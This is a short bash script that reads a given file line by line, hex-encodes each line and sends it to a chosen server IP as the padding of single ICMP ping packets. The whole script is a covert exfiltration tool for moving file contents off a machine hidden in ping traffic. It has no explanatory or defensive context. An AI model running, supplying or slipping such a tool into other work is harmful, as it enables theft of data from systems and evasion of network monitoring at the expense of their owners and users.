#!/bin/bash
IFS=$'\n'

function main(){
        if [ ${#@} -ne 2 ];then
                echo "USAGE: $0 [FILE_PATH] [SERVER_IP]"
                exit 1
        fi

        file_path=$1
        server_ip=$2

        for line in $(cat $1);do
                data=$(echo $line | xxd -c 256 -ps)
                size=${#data}

                ping -c 1 $server_ip -s $size -p $data
                sleep 1
        done

}

main ${@}
